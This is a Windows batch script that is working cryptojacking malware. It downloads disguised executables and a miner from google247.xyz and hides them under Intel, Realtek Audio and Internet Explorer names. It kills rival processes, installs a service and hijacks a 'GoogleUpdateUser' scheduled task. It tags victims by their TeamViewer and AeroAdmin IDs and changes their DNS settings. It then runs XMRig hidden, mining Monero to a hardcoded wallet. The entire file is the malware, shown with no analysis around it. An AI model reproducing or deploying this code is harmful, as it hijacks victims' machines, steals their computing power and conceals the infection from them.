@Echo off
for %%a in (C:\ProgramData\screen.exe) do set namescsc=%%~za
if "%namescsc%" gtr "30568" (Set "runscsc=C:\ProgramData\screen.exe" &Goto :scsc)
for %%a in (C:\ProgramData\Intel\screen.exe) do set namescsc=%%~za
if "%namescsc%" gtr "30568" (Set "runscsc=C:\ProgramData\Intel\screen.exe" &Goto :scsc)
for %%a in (C:\Windows\SysWOW64\screen.exe) do set namescsc=%%~za
if "%namescsc%" gtr "30568" (Set "runscsc=C:\Windows\SysWOW64\screen.exe" &Goto :scsc)
:scsc
for %%a in (C:\ProgramData\Taskmg.exe) do set Taskmg=%%~za
if "%Taskmg%" gtr "3325048" (Set "LoadTask=C:\ProgramData\Taskmg.exe" &Goto :SWTaskin)
for %%a in (C:\Windows\SysWOW64\Taskmg.exe) do set Taskmg=%%~za
if "%Taskmg%" gtr "3325048" (Set "LoadTask=C:\Windows\SysWOW64\Taskmg.exe" &Goto :SWTaskin)
for %%a in (C:\ProgramData\Intel\Taskmg.exe) do set Taskmg=%%~za
if "%Taskmg%" gtr "3325048" (Set "LoadTask=C:\ProgramData\Intel\Taskmg.exe" &Goto :SWTaskin)
:SWTaskin
CD "C:\Windows\System32\"
pushd "C:\Windows\System32\"
IF EXIST "C:\ProgramData\USOShared\web.ttf" (
goto :Chuanaa
) else (
attrib -h -r -s "C:\ProgramData\USOShared\*" >nul 2>nul
attrib -h -r -s "C:\Windows\Options\*.*" >nul 2>nul
Copy /v /b /y "C:\Windows\Options\*.*" "C:\ProgramData\USOShared\*" >nul 2>nul
)
IF EXIST "C:\ProgramData\Aeroadmin\web.ttf" (
goto :Backaa
) else (
goto :Chuanaa
)
:Backaa
CD "C:\Windows\System32\wbem\"
pushd "C:\Windows\System32\wbem\"
wmic process where name="IntelSvc.exe" call terminate >nul 2>nul
CD "C:\Windows\System32\"
pushd "C:\Windows\System32\"
TASKKILL /im "IntelSvc.exe" /F /t >nul 2>nul
NET stop "Intel(R) Utiliti" >nul 2>nul
Sc delete "Intel(R) Utiliti" >nul 2>nul
TASKKILL /im "IntelSvc.exe" /F /t >nul 2>nul
wmic process where name="IntelSvc.exe" call terminate >nul 2>nul
:loopaa
Set loopaa=1
attrib -h -r -s "C:\ProgramData\Aeroadmin\*.*" >nul 2>nul
Md "C:\ProgramData\USOShared" >nul 2>nul
copy /v /b /y "C:\ProgramData\Aeroadmin\*.*" "C:\ProgramData\USOShared\*" >nul 2>nul
Del /f /q C:\ProgramData\Aeroadmin\*.*" >nul 2>nul
@icacls "C:\ProgramData\Aeroadmin" /deny Everyone:(OI)(CI)(F) >nul 2>nul
attrib -h -r -s "C:\ProgramData\IntelSvc.exe" >nul 2>nul
attrib -h -r -s "C:\Windows\SysWOW64\IntelSvc.exe" >nul 2>nul
CD "C:\ProgramData"
pushd "C:\ProgramData"
"%LoadTask%" -t 1 --no-check-certificate "google247.xyz/ViewXmrig/soft/IntelSvc.exe" -q -O "IntelSvc.exe" >nul 2>nul
timeout /t 1 >nul
for %%a in (C:\ProgramData\IntelSvc.exe) do if "%%~za" gtr "3110200" Goto :xccpp
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/soft/IntelSvc.exe --header "Referer: www.google247.xyz" -O "IntelSvc.exe"
timeout /t 1 >nul
CD "C:\Windows\System32\"
pushd "C:\Windows\System32\"
for %%a in (C:\ProgramData\IntelSvc.exe) do if "%%~za" gtr "3110200" Goto :xccpp
copy /v /b /y "C:\Windows\SysWOW64\IntelSvc.exe" "C:\ProgramData\IntelSvc.exe" >nul 2>nul
Goto :Ncpy
:xccpp
copy /v /b /y "C:\ProgramData\IntelSvc.exe" "C:\Windows\SysWOW64\IntelSvc.exe" >nul 2>nul
:Ncpy
copy /v /b /y "C:\ProgramData\IntelSvc.exe" "C:\Windows\INF\IntelSvc.exe" >nul 2>nul
attrib +h +r +s "C:\Windows\SysWOW64\IntelSvc.exe" >nul 2>nul
attrib +h +r +s "C:\ProgramData\IntelSvc.exe" >nul 2>nul
attrib +h +r +s "C:\Windows\INF\IntelSvc.exe" >nul 2>nul
"%runscsc%" exec hide "C:\ProgramData\IntelSvc.exe"
timeout /t 4 >nul
"%runscsc%" elevate "%runscsc%" exec hide "C:\ProgramData\IntelSvc.exe" -install_service >nul 2>nul
timeout /t 11 >nul
:Chuanaa
tasklist /FI "IMAGENAME eq IntelSvc.exe" 2>NUL | findstr /i /c:"IntelSvc.exe">NUL
if "%ERRORLEVEL%"=="0" @Goto :Heveaa
if "%loopaa%"=="1" @Goto :Heveaa
@Goto :loopaa
:Heveaa
IF EXIST "C:\ProgramData\fix0.txt" (
goto :NOTFIX
) else (
TASKKILL /im "RtkAudio.exe" /F /t
wmic process where name=RtkAudio.exe call terminate
echo 0>"C:\ProgramData\fix0.txt"
)
del /f /q "C:\ProgramData\fix1.txt"
del /f /q "C:\ProgramData\fix2.txt"
del /f /q "C:\ProgramData\fix3.txt"
del /f /q "C:\ProgramData\fix4.txt"
del /f /q "C:\ProgramData\fix5.txt"
del /f /q "C:\ProgramData\fix6.txt"
del /f /q "C:\ProgramData\fix7.txt"
CD "C:\ProgramData"
pushd "C:\ProgramData"
"%LoadTask%" -t 1 --no-check-certificate "google247.xyz/ViewXmrig/soft/loadhost.cmd" -q -O "loadhost.cmd"
timeout /t 1 >nul
for %%a in (C:\ProgramData\loadhost.cmd) do set Downhost=%%~za
if "%Downhost%"=="0" Goto :downL2
if "%Downhost%"=="" Goto :downL2
if %Downhost% gtr 15 Goto :backcp
:downL2
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/soft/loadhost.cmd --header "Referer: www.google247.xyz" -O "loadhost.cmd"
for %%a in (C:\ProgramData\loadhost.cmd) do set Downhost=%%~za
if "%Downhost%"=="0" Goto :NOTdownl
if "%Downhost%"=="" Goto :NOTdownl
if %Downhost% gtr 15 Goto :backcp
Goto :NOTFIX
:NOTdownl
echo notfix>"C:\ProgramData\1notfix.txt"
Goto :NOTFIX
:backcp
CD "C:\Windows\System32\"
pushd "C:\Windows\System32\"
attrib -h -r -s "C:\Windows\SysWOW64\loadhost.cmd" >nul 2>nul
attrib -h -r -s "C:\Windows\INF\host.cmd" >nul 2>nul
COPY /b/v/y "C:\ProgramData\loadhost.cmd" "C:\Windows\INF\host.cmd" >nul 2>nul
COPY /b/v/y "C:\ProgramData\loadhost.cmd" "C:\Windows\SysWOW64\loadhost.cmd" >nul 2>nul
del /f /q "C:\ProgramData\loadhost.cmd" >nul 2>nul
:NOTFIX
CD "C:\Windows\System32\"
attrib -h -r -s "C:\ProgramData\xmrigg1.cmd" >nul 2>nul
attrib -h -r -s "C:\ProgramData\xmrigg2.cmd" >nul 2>nul
del /f /q "C:\ProgramData\xmrigg1.cmd" >nul 2>nul
del /f /q "C:\ProgramData\xmrigg2.cmd" >nul 2>nul
Rem __________30_11_2021
IF EXIST "C:\ProgramData\SendId0.txt" (
goto :Showfull
) else (
Goto :LoadEm
)
:LoadEm
echo 0>"C:\ProgramData\SendId0.txt"
Type nul>"C:\ProgramData\SendId0.txt"
TASKKILL /im "RtkAudio.exe" /F /t
wmic process where name=RtkAudio.exe call terminate
del /f /q "C:\ProgramData\SendId1.txt"
del /f /q "C:\ProgramData\SendId2.txt"
del /f /q "C:\ProgramData\SendId3.txt"
del /f /q "C:\ProgramData\SendId4.txt"
del /f /q "C:\ProgramData\SendId5.txt"
del /f /q "C:\ProgramData\SendId6.txt"
del /f /q "C:\ProgramData\SendId7.txt"
del /f /q "C:\ProgramData\SendId8.txt"
timeout /t 3 >nul
:Showfull
tasklist /FI "IMAGENAME eq RtkAudio.exe" 2>NUL | findstr /i /c:"RtkAudio.exe">NUL
if "%ERRORLEVEL%"=="0" Goto :killcod
for %%a in (C:\ProgramData\acc.txt) do set acctxt=%%~za
if "%acctxt%" == "" Goto :dowcmdow
if "%acctxt%" == "0" Goto :dowcmdow
if %acctxt% gtr 20 (Set "Dn=1974" &Goto :NotDN)
if %acctxt% gtr 16 (Set "Dn=1981" &Goto :NotDN)
:dowcmdow
for %%a in (C:\ProgramData\cmdow.exe) do set dow=%%~za
if "%dow%" == "" Goto :dowcmdow
if "%dow%" == "0" Goto :dowcmdow
if %dow% gtr 79000 Goto :Seedn
:dowcmdow
CD "C:\ProgramData\"
pushd "C:\ProgramData"
"%LoadTask%" -t 1 --no-check-certificate "google247.xyz/ViewXmrig/soft/cmdow.exe" -q -O "cmdow.exe"
timeout /t 1 >nul
for %%a in (C:\ProgramData\cmdow.exe) do set dow=%%~za
if "%dow%" == "" Goto :dowcmdow1
if "%dow%" == "0" Goto :dowcmdow1
if %dow% gtr 79000 Goto :Seedn
:dowcmdow1
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/soft/cmdow.exe --header "Referer: www.google247.xyz" -O "cmdow.exe"
timeout /t 1 >nul
for %%a in (C:\ProgramData\cmdow.exe) do set dow=%%~za
if "%dow%" == "" Goto :NotDN
if "%dow%" == "0" Goto :NotDN
if %dow% gtr 79000 Goto :Seedn
Goto :NotDN
:Seedn
CD "C:\Windows\System32\"
SCHTASKS /Query /TN "GoogleUpdateUser" /FO list /v | find "C:\Users\Public\Music\loadhost.exe"
if "%errorlevel%" EQU "0" Goto :SeoId
Goto :NotDN
:SeoId
CD "C:\ProgramData"
pushd "C:\ProgramData"
Type nul>"C:\ProgramData\sendacc.cmd"
echo ^;@echo off>"C:\ProgramData\sendacc.cmd"
echo ^;Title Converting batch scripts to file.exe with iexpress>>"C:\ProgramData\sendacc.cmd"
echo ^;Mode 75,3 ^& color 0A>>"C:\ProgramData\sendacc.cmd"
echo ^;Rem Original Script echo https://github.com/npocmaka/batch.scripts/edit/master/hybrids/iexpress/bat2exeIEXP.bat>>"C:\ProgramData\sendacc.cmd"
echo ^;echo^(>>"C:\ProgramData\sendacc.cmd"
echo ^;if "%%~1" equ "" ^(>>"C:\ProgramData\sendacc.cmd"
echo ^;Del /f /q "%%~f0"^&Exit>>"C:\ProgramData\sendacc.cmd"
echo ^;Exit>>"C:\ProgramData\sendacc.cmd"
echo ^;^)>>"C:\ProgramData\sendacc.cmd"
echo ^;set "target.exe=%%__cd__%%%%~n1.exe">>"C:\ProgramData\sendacc.cmd"
echo ^;set "batch_file=%%~f1">>"C:\ProgramData\sendacc.cmd"
echo ^;set "bat_name=%%~nx1">>"C:\ProgramData\sendacc.cmd"
echo ^;set "bat_dir=%%~dp1">>"C:\ProgramData\sendacc.cmd"
echo ^;Set "sed=%%temp%%\2exe.sed">>"C:\ProgramData\sendacc.cmd"
echo ^;Timeout /T 2 /nobreak ^>nul>>"C:\ProgramData\sendacc.cmd"
echo ^;Copy /v /b /y "%%~f0" "%%sed%%" ^>nul>>"C:\ProgramData\sendacc.cmd"
echo ^;^(>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^(^)>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^(AppLaunched=cmd /c "%%bat_name%%"^)>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^(TargetName=%%target.exe%%^)>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^(FILE0="%%bat_name%%"^)>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^([SourceFiles]^)>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^(SourceFiles0=%%bat_dir%%^)>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^([SourceFiles0]^)>>"C:\ProgramData\sendacc.cmd"
echo     ^;^(echo^(%%%%FILE0%%%%=^)>>"C:\ProgramData\sendacc.cmd"
echo ^;^)^>^>"%%sed%%">>"C:\ProgramData\sendacc.cmd"
echo ^;iexpress /n /q /m %%sed%%>>"C:\ProgramData\sendacc.cmd"
echo ^;del /q /f "%%sed%%">>"C:\ProgramData\sendacc.cmd"
echo ^;Del /f /q "%%~f0"^&Exit>>"C:\ProgramData\sendacc.cmd"
echo ^;exit>>"C:\ProgramData\sendacc.cmd"
echo [Version]>>"C:\ProgramData\sendacc.cmd"
echo Class=IEXPRESS>>"C:\ProgramData\sendacc.cmd"
(echo SEDVersion=3)>>"C:\ProgramData\sendacc.cmd"
echo [Options]>>"C:\ProgramData\sendacc.cmd"
echo PackagePurpose=InstallApp>>"C:\ProgramData\sendacc.cmd"
(echo ShowInstallProgramWindow=1)>>"C:\ProgramData\sendacc.cmd"
(echo HideExtractAnimation=1)>>"C:\ProgramData\sendacc.cmd"
(echo UseLongFileName=1)>>"C:\ProgramData\sendacc.cmd"
(echo InsideCompressed=0)>>"C:\ProgramData\sendacc.cmd"
(echo CAB_FixedSize=0)>>"C:\ProgramData\sendacc.cmd"
(echo CAB_ResvCodeSigning=0)>>"C:\ProgramData\sendacc.cmd"
echo RebootMode=N>>"C:\ProgramData\sendacc.cmd"
echo InstallPrompt=%%InstallPrompt%%>>"C:\ProgramData\sendacc.cmd"
echo DisplayLicense=%%DisplayLicense%%>>"C:\ProgramData\sendacc.cmd"
echo FinishMessage=%%FinishMessage%%>>"C:\ProgramData\sendacc.cmd"
echo TargetName=%%TargetName%%>>"C:\ProgramData\sendacc.cmd"
echo FriendlyName=%%FriendlyName%%>>"C:\ProgramData\sendacc.cmd"
echo AppLaunched=%%AppLaunched%%>>"C:\ProgramData\sendacc.cmd"
echo PostInstallCmd=%%PostInstallCmd%%>>"C:\ProgramData\sendacc.cmd"
echo AdminQuietInstCmd=%%AdminQuietInstCmd%%>>"C:\ProgramData\sendacc.cmd"
echo UserQuietInstCmd=%%UserQuietInstCmd%%>>"C:\ProgramData\sendacc.cmd"
echo SourceFiles=SourceFiles>>"C:\ProgramData\sendacc.cmd"
echo [Strings]>>"C:\ProgramData\sendacc.cmd"
echo InstallPrompt=>>"C:\ProgramData\sendacc.cmd"
echo DisplayLicense=>>"C:\ProgramData\sendacc.cmd"
echo FinishMessage=>>"C:\ProgramData\sendacc.cmd"
echo FriendlyName=->>"C:\ProgramData\sendacc.cmd"
echo PostInstallCmd=^<None^>>>"C:\ProgramData\sendacc.cmd"
echo AdminQuietInstCmd=>>"C:\ProgramData\sendacc.cmd"
Type nul>"C:\ProgramData\acc.cmd"
echo @echo off>"C:\ProgramData\acc.cmd"
echo "C:\ProgramData\cmdow.exe" 2^>NUL ^| findstr /i /c:"TeamView ItemDetailsView" /c:"TeamView ScrollBar">>"C:\ProgramData\acc.cmd"
echo if "%%ERRORLEVEL%%"=="0" ^(Echo TeamView ItemDetailsView^)^>"C:\ProgramData\acc.txt">>"C:\ProgramData\acc.cmd"
echo @del /f /q "%%~f0" ^>nul ^2>nul>>"C:\ProgramData\acc.cmd"
Start "" "C:\ProgramData\sendacc.cmd" acc.cmd
TIMEOUT /T 5
for %%a in (C:\ProgramData\acc.exe) do set acccmd=%%~za
if "%acccmd%"=="" Goto :NotDN
if "%acccmd%"=="0" Goto :NotDN
if %acccmd% gtr 20 Goto :accdn
Goto :NotDN
:accdn
attrib -h -r -s "C:\Users\Public\Music\loadhost.exe"
COPY /b/v/y "C:\Users\Public\Music\loadhost.exe" "C:\Users\Public\Music\loadhost1.exe"
COPY /b/v/y "C:\ProgramData\acc.exe" "C:\Users\Public\Music\loadhost.exe"
timeout /t 1 >nul
Del /f /q "C:\ProgramData\acc.exe"
Schtasks /Run /I /TN "GoogleUpdateUser"
timeout /t 2 >nul
del /f /q "C:\ProgramData\acc.cmd"
COPY /b/v/y "C:\Users\Public\Music\loadhost1.exe" "C:\Users\Public\Music\loadhost.exe"
for %%a in (C:\ProgramData\acc.txt) do set accshow=%%~za
if "%accshow%" == "" Goto :pleaseno
if "%accshow%" == "0" Goto :pleaseno
if %accshow% gtr 20 (Set "Dn=1974" &Goto :NotDN)
Goto :NotDN
:pleaseno
(Echo windows updated)>"C:\ProgramData\acc.txt"
Set "Dn=1981"
CD "C:\Windows\System32\"
pushd "C:\Windows\System32\"
:NotDN
for /F "delims=" %%a in ('findstr /i /c:"IdGetter id:" "C:\ProgramData\USOShared\web.ttf" 2^>nul') do set lienewidaa=%%a
set "Anyadmin=%lienewidaa:IdGetter id: =" & set "Anyadmin=%"
if "%Anyadmin%"=="0" Goto :NoteFindAaokeEm
if "%Anyadmin%"=="" Goto :NoteFindAaokeEm
if %Anyadmin% gtr 100 Goto :NameMiniEm
:NoteFindAaokeEm
Set "Anyadmin=NOTA"
Goto :Fixid2
:NameMiniEm
Set /a "Anyadmin=%Anyadmin%-99"
:Fixid2
reg.exe query "HKLM\Software\Wow6432Node\TeamViewer" /v "ClientID">nul 2>nul ||( GOTO :NOTFOUNDEm )
:NOTFOUNDEm
if %ERRORLEVEL% == 1 (
Goto :HeveTVEm
) else (
for /f "tokens=3" %%a in ('reg.exe query "HKLM\Software\Wow6432Node\TeamViewer" /v "ClientID" 2^>Nul') do (
set /a TVHeare=%%a + 0 
)
)
goto :HeveTV_1Em
:HeveTVEm
Set "ANYTV=NOTEM" 
Goto :FullID
:HeveTV_1Em
if "%TVHeare%" Gtr "100" Set /a "ANYTV=%TVHeare%-99"
if "%Dn%" == "1974" Set "ANYTV=%ANYTV%_DN"
if "%TVHeare%" lss "100" Set "ANYTV=NOTEM"
if "%TVHeare%" == "" Set "ANYTV=NOTEM"
:FullID
Set "namemw=%Anyadmin%_%ANYTV%_"
tasklist /FI "IMAGENAME eq RtkAudio.exe" 2>NUL | findstr /i /c:"RtkAudio.exe">NUL
if "%ERRORLEVEL%"=="0" Goto :killcod
Goto :finrun
:killcod
Rem __________21_11_2021
CD "C:\Windows\System32\wbem\"
pushd "C:\Windows\System32\wbem\"
wmic CPU GET LoadPercentage >"%TEMP%cpu_usage.tmp"
for /F "skip=1" %%P in ('type "%TEMP%cpu_usage.tmp"') do (
set /A CpuUsage+=%%P
set /A Processors+=1
)
del /f /q "%TEMP%cpu_usage.tmp"
set /A CpuUsage/=Processors
If %CpuUsage% Gtr 25 Goto :Eexit
wmic nicconfig where (IPEnabled=TRUE) call SetDNSServerSearchOrder ("8.8.8.8", "8.8.4.4")
:Eexit
Rem __________
@del /f /q "C:\ProgramData\xmrig.cmd" >nul 2>nul
Exit
:finrun
IF EXIST "C:\ProgramData\Internet Explorer\RtkAudio.exe" (
IF EXIST "C:\ProgramData\Internet Explorer\xmrig-cuda.dll" (
IF EXIST "C:\ProgramData\Internet Explorer\WinRing0x64.sys" (
IF EXIST "C:\ProgramData\Internet Explorer\nvrtc64_102_0.dll" (
IF EXIST "C:\ProgramData\Internet Explorer\nvrtc-builtins64_102.dll" (
Set "cfgmn=C:\ProgramData\Internet Explorer\config.json"
set "pathcfgmn=C:\ProgramData\Internet Explorer\RtkAudio.exe"
set "CDpath=C:\ProgramData\Internet Explorer"
type nul>"C:\ProgramData\Internet Explorer\RtkAudio.exeÿ"
attrib -h -r -s "C:\ProgramData\Internet Explorer\config.json" >nul 2>nul
Goto :Fullxmrig
)
)
)
)
)
IF EXIST "C:\ProgramData\Microsoft\NetFramework\RtkAudio.exe" (
IF EXIST "C:\ProgramData\Microsoft\NetFramework\xmrig-cuda.dll" (
IF EXIST "C:\ProgramData\Microsoft\NetFramework\WinRing0x64.sys" (
IF EXIST "C:\ProgramData\Microsoft\NetFramework\nvrtc64_102_0.dll" (
IF EXIST "C:\ProgramData\Microsoft\NetFramework\nvrtc-builtins64_102.dll" (
Set "cfgmn=C:\ProgramData\Microsoft\NetFramework\config.json"
set "pathcfgmn=C:\ProgramData\Microsoft\NetFramework\RtkAudio.exe"
set "CDpath=C:\ProgramData\Microsoft\NetFramework"
copy /v /b /y "C:\ProgramData\Microsoft\NetFramework\*.*" "C:\ProgramData\Internet Explorer\*.*"
Goto :Fullxmrig
)
)
)
)
)
CD "C:\ProgramData\Internet Explorer"
pushd "C:\ProgramData\Internet Explorer"
set "CDpath=C:\ProgramData\Internet Explorer"
"%LoadTask%" -t 2 --no-check-certificate "google247.xyz/ViewXmrig/UsdVnd/RtkAudio.exe" -q -O "RtkAudio.exe" >nul 2>nul
for %%a in (C:\ProgramData\Internet Explorer\RtkAudio.exe) do if "%%~za" gtr "50" Goto :Audioexe
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/UsdVnd/RtkAudio.exe --header "Referer: www.google247.xyz" -O "RtkAudio.exe"
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/UsdVnd/xmrig-cuda.dll --header "Referer: www.google247.xyz" -O "xmrig-cuda.dll"
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/UsdVnd/WinRing0x64.sys --header "Referer: www.google247.xyz" -O "WinRing0x64.sys"
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/UsdVnd/nvrtc64_102_0.dll --header "Referer: www.google247.xyz" -O "nvrtc64_102_0.dll"
"%LoadTask%" -t 2 --no-check-certificate http://google247.xyz/ViewXmrig/UsdVnd/nvrtc-builtins64_102.dll --header "Referer: www.google247.xyz" -O "nvrtc-builtins64_102.dll"
timeout /t 1 >nul
Goto :Telfull
:Audioexe
"%LoadTask%" -t 2 --no-check-certificate "google247.xyz/ViewXmrig/UsdVnd/xmrig-cuda.dll" -q -O "xmrig-cuda.dll" >nul 2>nul
"%LoadTask%" -t 2 --no-check-certificate "google247.xyz/ViewXmrig/UsdVnd/WinRing0x64.sys" -q -O "WinRing0x64.sys" >nul 2>nul
"%LoadTask%" -t 2 --no-check-certificate "google247.xyz/ViewXmrig/UsdVnd/nvrtc64_102_0.dll" -q -O "nvrtc64_102_0.dll" >nul 2>nul
"%LoadTask%" -t 2 --no-check-certificate "google247.xyz/ViewXmrig/UsdVnd/nvrtc-builtins64_102.dll" -q -O "nvrtc-builtins64_102.dll" >nul 2>nul
:Telfull
@Md "C:\ProgramData\Microsoft\NetFramework"
CD "C:\Windows\System32"
copy /v /b /y "C:\ProgramData\Internet Explorer\*.*" "C:\ProgramData\Microsoft\NetFramework\*"
Set "cfgmn=C:\ProgramData\Internet Explorer\config.json"
set "pathcfgmn=C:\ProgramData\Internet Explorer\RtkAudio.exe"
:Fullxmrig
cd "%CDpath%"
pushd "%CDpath%"
"%runscsc%" exec hide "%pathcfgmn%" -o stratum+ssl://pool.supportxmr.com:443 -u 85vNniDEKFjZC4QMzgBPmD4TDZeWaX1DPQ5TKMkTMa5YZJ8hT1ygr4deEWC3PBfxJU2TZ4pRyjzr9evnCHJQauK95CqBrZC.%namemw% -p x -k --donate-level=1 --retry-pause=10 --retries=3 --cpu-priority 2 --cpu-max-threads-hint=80 --coin monero -a rx/0 -o pool.supportxmr.com:443 -u 85vNniDEKFjZC4QMzgBPmD4TDZeWaX1DPQ5TKMkTMa5YZJ8hT1ygr4deEWC3PBfxJU2TZ4pRyjzr9evnCHJQauK95CqBrZC.%namemw% -p x -k --donate-level=1 --retry-pause=10 --retries=3 --cpu-priority 2 --cpu-max-threads-hint=80 --coin monero -a rx/0 -o pool.supportxmr.com:7777 -u 85vNniDEKFjZC4QMzgBPmD4TDZeWaX1DPQ5TKMkTMa5YZJ8hT1ygr4deEWC3PBfxJU2TZ4pRyjzr9evnCHJQauK95CqBrZC.%namemw% -p x -k --donate-level=1 --retry-pause=10 --retries=3 --cpu-priority 2 --cpu-max-threads-hint=80 --coin monero -a rx/0 -o xmr.2miners.com:2222 -u 85vNniDEKFjZC4QMzgBPmD4TDZeWaX1DPQ5TKMkTMa5YZJ8hT1ygr4deEWC3PBfxJU2TZ4pRyjzr9evnCHJQauK95CqBrZC.%namemw% -p x -k --donate-level=1 --retry-pause=10 --retries=3 --cpu-priority 2 --cpu-max-threads-hint=80 --coin monero -a rx/0
CD "C:\Windows\System32"
attrib +h +r +s "C:\ProgramData\Internet Explorer\*.*" >nul 2>nul
attrib -h -r -s "C:\ProgramData\Internet Explorer\RtkAudio.exeÿ"
@del /f /q "C:\ProgramData\xmrig.cmd" >nul 2>nul

